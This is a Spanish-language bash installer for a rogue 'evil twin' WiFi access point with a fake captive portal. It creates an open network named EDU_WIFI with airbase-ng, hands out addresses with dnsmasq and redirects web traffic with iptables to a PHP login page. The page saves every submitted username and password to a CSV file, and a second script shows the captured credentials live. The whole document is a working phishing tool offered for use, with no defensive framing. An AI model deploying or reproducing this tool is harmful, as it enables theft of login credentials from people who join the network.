#!/bin/bash
echo "[+] Instalando Portal WiFi Cautivo"
echo "[+] Por: Eduardo Jurado"

# Instalar dependencias
echo "[+] Instalando dependencias..."
sudo apt update
sudo apt install hostapd dnsmasq php -y

# Crear directorio
mkdir -p /opt/edu_lvc
cd /opt/edu_lvc

# Crear HTML simple del portal
cat > index.php << 'EOF'
<?php
if ($_POST['usuario'] && $_POST['clave']) {
    $fecha = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $log = "$fecha,$ip," . $_POST['usuario'] . "," . $_POST['clave'] . "\n";
    file_put_contents("credenciales.csv", $log, FILE_APPEND);
    header("Location: http://www.google.com");
    exit;
}
?>
<html>
<head>
<title>Acceso WiFi</title>
<style>
body { font-family: Arial; margin: 40px; }
.login { background: #f0f0f0; padding: 20px; border-radius: 10px; max-width: 300px; margin: 0 auto; }
input { width: 100%; padding: 10px; margin: 5px 0; }
button { background: #007cba; color: white; padding: 10px; width: 100%; border: none; }
</style>
</head>
<body>
<center>
<h2>Acceso a WiFi</h2>
<div class="login">
<form method="POST">
<input name="usuario" placeholder="Usuario" required><br>
<input name="clave" type="password" placeholder="Contraseña" required><br>
<button type="submit">Conectar</button>
</form>
</div>
<p style="color:#666;font-size:12px;">edu.lvc</p>
</center>
</body>
</html>
EOF

# Crear script de inicio
cat > iniciar.sh << 'EOF'
#!/bin/bash
echo "[+] Iniciando Portal WiFi - edu.lvc"
echo "[+] Por: Eduardo Jurado"

# Parar servicios
sudo pkill airbase-ng
sudo pkill dnsmasq
sudo pkill php
sudo airmon-ng check kill

# Limpiar reglas
sudo iptables -F
sudo iptables -t nat -F

# Iniciar Access Point
echo "[+] Creando red: EDU_WIFI"
sudo airbase-ng -e "EDU_WIFI" -c 6 wlan0 &

sleep 5

# Configurar interfaz
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 up

# DHCP
echo "[+] Iniciando DHCP..."
sudo dnsmasq --no-daemon --interface=at0 --dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h --dhcp-option=3,192.168.1.1 --dhcp-option=6,192.168.1.1 &

# Redirección
sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 8080
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Portal
echo "[+] Iniciando portal..."
cd /opt/edu_lvc
sudo php -S 192.168.1.1:8080 &

echo "[✅] PORTAL ACTIVO"
echo "[📡] Red: EDU_WIFI"
echo "[🌐] Los usuarios serán redirigidos automáticamente"
echo "[📝] Credenciales: /opt/edu_lvc/credenciales.csv"
EOF

# Crear script de monitoreo
cat > monitorear.sh << 'EOF'
#!/bin/bash
echo "[+] Monitoreo - edu.lvc"
echo "[+] Por: Eduardo Jurado"

while true; do
    clear
    echo "=== PORTAL WIFI ACTIVO ==="
    echo "edu.lvc - Eduardo Jurado"
    echo "=========================="
    
    if [ -f "credenciales.csv" ]; then
        echo "CREDENCIALES CAPTURADAS:"
        echo "-----------------------"
        tail -10 credenciales.csv | awk -F',' '{print "👤 " $3 " | 🔒 " $4}'
        echo "-----------------------"
        echo "Total: $(wc -l < credenciales.csv)"
    else
        echo "Esperando conexiones..."
        echo "Red: EDU_WIFI"
    fi
    sleep 3
done
EOF

# Dar permisos
chmod +x iniciar.sh monitorear.sh

echo "[✅] Instalación completada"
echo "[?] Usa: ./iniciar.sh para comenzar"
echo "[?] Usa: ./monitorear.sh para ver credenciales"
